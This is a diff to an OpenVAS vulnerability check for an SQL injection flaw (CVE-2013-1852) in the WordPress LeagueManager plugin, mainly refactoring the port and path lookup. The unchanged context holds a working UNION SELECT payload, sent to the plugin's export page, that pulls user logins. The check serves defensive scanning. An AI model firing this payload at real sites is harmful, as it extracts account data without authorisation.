@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_leaguemanager_plugin_mult_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
+# $Id: gb_wordpress_leaguemanager_plugin_mult_vuln.nasl 11620 2018-09-26 09:10:24Z asteins $
 #
 # Wordpress LeagueManager Plugin Multiple Vulnerabilities
 #
@@ -42,12 +42,12 @@ For updates refer to http://wordpress.org/support/plugin/leaguemanager");
   script_tag(name:"summary", value:"This host is installed with Wordpress LeagueManager Plugin and
 is prone to multiple vulnerabilities.");
   script_oid("1.3.6.1.4.1.25623.1.0.803439");
-  script_version("$Revision: 11401 $");
+  script_version("$Revision: 11620 $");
   script_bugtraq_id(58503);
   script_cve_id("CVE-2013-1852");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-26 11:10:24 +0200 (Wed, 26 Sep 2018) $");
   script_tag(name:"creation_date", value:"2013-03-18 10:46:35 +0530 (Mon, 18 Mar 2013)");
   script_name("Wordpress LeagueManager Plugin Multiple Vulnerabilities");
 
@@ -69,14 +69,21 @@ is prone to multiple vulnerabilities.");
   exit(0);
 }
 
+CPE = 'cpe:/a:wordpress:wordpress';
+
+include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 include("version_func.inc");
 
-port = get_http_port(default:80);
-if(!dir = get_dir_from_kb(port:port, app:"WordPress")){
+if (!port = get_app_port(cpe: CPE))
   exit(0);
-}
+
+if (!dir = get_app_location(cpe: CPE, port: port))
+  exit(0);
+
+if (dir == "/")
+  dir = "";
 
 url = dir + "/wp-admin/admin.php?page=leaguemanager-export";
 postData = "league_id=7 UNION SELECT ALL user_login,2,3,4,5,6,7,8,9,10,11,12,13,"+
@@ -93,6 +100,7 @@ sndReq = string("POST ", url, " HTTP/1.1\r\n",
 
 rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);
 
-if(rcvRes && rcvRes =~ 'Season.*Team.*Website.*Coach.*Home'){
-  security_message(port);
+if(rcvRes && rcvRes =~ 'Season.*Team.*Website.*Coach.*Home') {
+  security_message(port:port, data:"The target host was found to be vulnerable");
+	exit(0);
 }
